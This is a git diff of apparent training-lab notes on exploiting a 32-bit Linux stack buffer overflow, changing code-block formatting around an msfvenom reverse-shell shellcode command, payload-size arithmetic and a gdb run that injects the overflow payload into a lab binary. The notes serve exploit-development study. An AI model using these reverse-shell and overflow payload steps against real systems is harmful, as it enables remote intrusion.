@@ -13,7 +13,7 @@ But before we generate our shellcode, we have to make sure that the individual c
 <mark style="color:green;">**MSFvenom Syntax**</mark>
 
 {% code overflow="wrap" fullWidth="true" %}
-```shell-session
+```shellscript
 msfvenom -p linux/x86/shell_reverse_tcp lhost=<LHOST> lport=<LPORT> --format c --arch x86 --platform linux --bad-chars "<chars>" --out <filename>
 ```
 {% endcode %}
@@ -21,7 +21,7 @@ msfvenom -p linux/x86/shell_reverse_tcp lhost=<LHOST> lport=<LPORT> --format c -
 <mark style="color:green;">**MSFvenom - Generate Shellcode**</mark>
 
 {% code overflow="wrap" fullWidth="true" %}
-```shell-session
+```shellscript
 msfvenom -p linux/x86/shell_reverse_tcp lhost=127.0.0.1 lport=31337 --format c --arch x86 --platform linux --bad-chars "\x00\x09\x0a\x20" --out shellcode
 
 ```
@@ -29,7 +29,7 @@ msfvenom -p linux/x86/shell_reverse_tcp lhost=127.0.0.1 lport=31337 --format c -
 
 <mark style="color:green;">**Shellcode**</mark>
 
-```shell-session
+```shellscript
 mrroboteLiot_1@htb[/htb]$ cat shellcode
 
 unsigned char buf[] = 
@@ -43,7 +43,7 @@ Now that we have our shellcode, we adjust it to have only one string, and then w
 
 <mark style="color:green;">**Notes**</mark>
 
-```shell-session
+```bash
    Buffer = "\x55" * (1040 - 124 - 95 - 4) = 817
      NOPs = "\x90" * 124
 Shellcode = "\xda\xca\xba\xe4\x11...<SNIP>...\x5a\x22\xa2"
@@ -52,7 +52,8 @@ Shellcode = "\xda\xca\xba\xe4\x11...<SNIP>...\x5a\x22\xa2"
 
 <mark style="color:green;">**Exploit with Shellcode**</mark>
 
-```shell-session
+{% code fullWidth="true" %}
+```bash
 (gdb) run $(python -c 'print "\x55" * (1040 - 124 - 95 - 4) + "\x90" * 124 + "\xda\xca\xba\xe4...<SNIP>...\xad\xec\xa0\x04\x5a\x22\xa2" + "\x66" * 4')
 
 The program being debugged has been started already.
@@ -62,6 +63,7 @@ Starting program: /home/student/bow/bow32 $(python -c 'print "\x55" * (1040 - 12
 
 Breakpoint 1, 0x56555551 in bowfunc ()
 ```
+{% endcode %}
 
 Next, we check if the first bytes of our shellcode match the bytes after the NOPS.
 
